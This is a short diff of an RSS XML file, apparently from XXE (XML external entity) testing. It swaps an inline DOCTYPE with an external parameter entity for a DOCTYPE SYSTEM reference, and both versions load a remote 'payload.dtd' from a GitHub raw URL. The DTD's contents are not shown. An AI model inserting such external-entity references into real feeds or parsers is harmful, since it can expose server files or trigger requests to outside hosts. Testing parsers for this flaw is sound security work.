@@ -1,9 +1,5 @@
 <?xml version="1.0"?>
-<!DOCTYPE rss [
-  <!ELEMENT rss ANY>
-  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
-  %dtd;
-]>
+<!DOCTYPE rss SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
 <rss>
     <channel>
         <item>
